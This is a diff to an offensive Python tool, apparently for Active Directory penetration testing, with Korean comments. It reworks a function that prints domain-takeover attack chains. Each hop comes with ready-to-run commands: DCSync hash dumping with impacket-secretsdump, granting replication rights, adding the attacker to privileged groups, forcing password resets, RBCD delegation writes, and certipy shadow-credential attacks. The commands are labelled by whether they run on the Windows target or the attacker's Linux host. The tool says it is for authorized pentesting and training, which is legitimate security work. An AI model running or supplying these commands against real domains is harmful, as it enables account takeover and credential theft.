@@ -768,30 +768,36 @@ DOMAIN_TAKE_RIGHTS = {"GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "
 
 
 def _hop_cmds(right, ttype, target):
-    """체인 한 홉의 대표 명령(치환 토큰 corp.local/dc01/attacker/Passw0rd! 사용)."""
+    """체인 한 홉의 대표 명령. (platform, cmd) 튜플 리스트 반환.
+    platform: WIN=대상 윈도우 쉘(evil-winrm 등) / KALI=공격자 리눅스 / note=주석.
+    치환 토큰 corp.local/dc01/attacker/Passw0rd! 사용."""
     sam = (target or "").split("@")[0]          # NAME@DOMAIN -> NAME (sAMAccountName)
     if right == "DCSync" or ttype == "domain":
         if right == "DCSync":
-            return ["impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc"]
+            return [("KALI", "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc")]
         return [
-            "# attacker 에게 DCSync(복제) 권한을 부여한 뒤 전체 해시 덤프",
-            "PowerView> Add-DomainObjectAcl -TargetIdentity 'corp.local' -PrincipalIdentity attacker -Rights DCSync",
-            "impacket-dacledit -action write -rights DCSync -principal attacker -target-dn 'DC=corp,DC=local' 'corp.local/attacker:Passw0rd!'",
-            "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc",
+            ("note", "# attacker 에게 DCSync(복제) 권한을 부여한 뒤 전체 해시 덤프"),
+            ("WIN", "Import-Module .\\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity 'corp.local' -PrincipalIdentity attacker -Rights DCSync"),
+            ("KALI", "impacket-dacledit -action write -rights DCSync -principal attacker -target-dn 'DC=corp,DC=local' 'corp.local/attacker:Passw0rd!'"),
+            ("KALI", "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc"),
         ]
     if ttype == "group":
         return [
-            f"net rpc group addmem '{sam}' attacker -U 'corp.local/attacker%Passw0rd!' -S dc01",
-            f"PowerView> Add-DomainGroupMember -Identity '{sam}' -Members attacker",
-            f"bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember '{sam}' attacker",
+            ("WIN", f"net group \"{sam}\" attacker /add /domain"),
+            ("WIN", f"Import-Module .\\PowerView.ps1; Add-DomainGroupMember -Identity \"{sam}\" -Members attacker"),
+            ("KALI", f"net rpc group addmem \"{sam}\" attacker -U 'corp.local/attacker%Passw0rd!' -S dc01"),
+            ("KALI", f"bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember \"{sam}\" attacker"),
         ]
     if ttype == "computer":
         host = sam.split(".")[0] + "$"
-        return [f"impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to '{host}' -action write 'corp.local/attacker:Passw0rd!'"]
+        return [("KALI", f"impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to '{host}' -action write 'corp.local/attacker:Passw0rd!'")]
     # user
     if right in ("ForceChangePassword", "GenericAll", "AllExtendedRights"):
-        return [f"net rpc password '{sam}' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01"]
-    return [f"certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account '{sam}'"]
+        return [
+            ("WIN", f"net user \"{sam}\" NewPass123! /domain"),
+            ("KALI", f"net rpc password \"{sam}\" 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01"),
+        ]
+    return [("KALI", f"certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account '{sam}'")]
 
 
 def find_attack_paths(edges, sid_map, nodes, owned_sids, max_paths=4, max_nodes=6000):
@@ -1170,6 +1176,9 @@ def print_ad_report(edges, props, ad_db, sid_map, nodes, ctx=None):
         print(f"{C.RED}{C.BOLD} 🎯 도메인 장악 경로 (엣지 체이닝){who}{C.RESET}")
         print(f"{C.RED}{C.BOLD}{'='*74}{C.RESET}")
         print(f"  {C.GREY}개별 엣지를 이어붙인 실제 공격 경로. 위에서 아래로 순서대로 실행.{C.RESET}")
+        print(f"  {C.DIM}명령 실행 위치: {C.RESET}{C.YELLOW}[WIN]{C.DIM}=대상 윈도우 쉘(evil-winrm 등)  "
+              f"{C.RESET}{C.CYAN}[KALI]{C.DIM}=공격자 리눅스. "
+              f"net rpc/impacket/bloodyAD 는 리눅스 전용(윈도우 쉘에 붙여넣으면 실패).{C.RESET}")
         for pi, hops in enumerate(paths, 1):
             start_name = hops[0]["frm"] if hops else "?"
             n_attack = sum(1 for h in hops if h["label"] != "MemberOf")
@@ -1182,11 +1191,14 @@ def print_ad_report(edges, props, ad_db, sid_map, nodes, ctx=None):
                     dom = " ⇒ DCSync" if h["to_type"] == "domain" else ""
                     print(f"      {C.RED}└ ({h['label']}) →{C.RESET} "
                           f"{C.BOLD}{h['to']}{C.RESET} {C.GREY}[{h['to_type']}]{C.RESET}{C.RED}{C.BOLD}{dom}{C.RESET}")
-                    for c in _hop_cmds(h["label"], h["to_type"], h["to"]):
+                    for plat, c in _hop_cmds(h["label"], h["to_type"], h["to"]):
                         cc = _sub(c, subs)
-                        col = C.GREY if cc.strip().startswith("#") else C.GREEN
-                        pre = "" if cc.strip().startswith("#") else "$ "
-                        print(f"          {col}{pre}{cc}{C.RESET}")
+                        if plat == "note":
+                            print(f"          {C.GREY}{cc}{C.RESET}")
+                        else:
+                            ptag = (f"{C.YELLOW}[WIN ]{C.RESET}" if plat == "WIN"
+                                    else f"{C.CYAN}[KALI]{C.RESET}")
+                            print(f"          {ptag} {C.GREEN}$ {cc}{C.RESET}")
 
     print(f"\n{C.DIM}[안내] PETS AD 모드는 인가된 모의해킹/실습용입니다. "
           f"비번 리셋 등은 운영 계정 잠금 위험이 있으니 대상 권한을 확인하고 사용하세요.{C.RESET}\n")
